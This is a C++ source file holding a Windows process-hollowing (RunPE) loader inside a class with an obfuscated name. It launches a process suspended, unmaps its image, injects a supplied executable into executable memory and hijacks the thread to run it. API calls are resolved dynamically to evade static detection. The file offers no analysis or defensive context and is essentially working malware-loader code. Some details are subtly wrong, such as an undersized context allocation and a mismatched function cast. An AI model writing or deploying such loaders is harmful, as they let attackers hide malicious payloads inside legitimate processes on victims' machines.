#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <wchar.h>
typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef BOOL(WINAPI * NtSetThreadContext)(HANDLE hThread, PCONTEXT lpContext);
typedef LPVOID(WINAPI * callVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef LPVOID(WINAPI * callVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef bool(WINAPI * callReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
typedef bool(WINAPI * callWriteProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
typedef HANDLE(WINAPI * callCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
typedef HANDLE(WINAPI * callProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef HANDLE(WINAPI * callProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

class WhAkDM2s
{
public:
    void run(LPSTR szFilePath, LPVOID pFile)
    {
    PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;
	NtUnmapViewOfSection xNtUnmapViewOfSection;
	NtSetThreadContext xNtSetThreadContext;
	callReadProcessMemory xReadProcessMemory;
	callWriteProcessMemory xWriteProcessMemory;
	callVirtualAlloc xVirtualAlloc;
	callVirtualAllocEx xVirtualAllocEx;
	LPVOID pImageBase;
	int Count;
	IDH = PIMAGE_DOS_HEADER(pFile);

	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				xVirtualAlloc = callVirtualAlloc(GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc"));
				xVirtualAllocEx = callVirtualAllocEx(GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAllocEx"));
				xReadProcessMemory = callReadProcessMemory(GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadProcessMemory"));
				xWriteProcessMemory = callReadProcessMemory(GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory"));
				CTX = PCONTEXT(xVirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
				{
					xReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);

					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
					}

					pImageBase = xVirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

					if (pImageBase)
					{
						xWriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);

						DWORD* x;
						DWORD* y;
						DWORD* z;
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{

                            x = (DWORD*)(DWORD(pFile) + IDH->e_lfanew + (Count * 40) + 248 + 12);
                            y = (DWORD*)(DWORD(pFile) + IDH->e_lfanew + (Count * 40) + 248 + 20);
                            z = (DWORD*)(DWORD(pFile) + IDH->e_lfanew + (Count * 40) + 248 + 16);

							xWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + *x), LPVOID(DWORD(pFile) + *y), *z, NULL);
						}
						xWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;

						xNtSetThreadContext = NtSetThreadContext(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetContextThread"));
						xNtSetThreadContext(PI.hThread, LPCONTEXT(CTX));

						ResumeThread(PI.hThread);
					}
				}
			}
		}
	}
	VirtualFree(pFile, 0, MEM_RELEASE);
    }
};

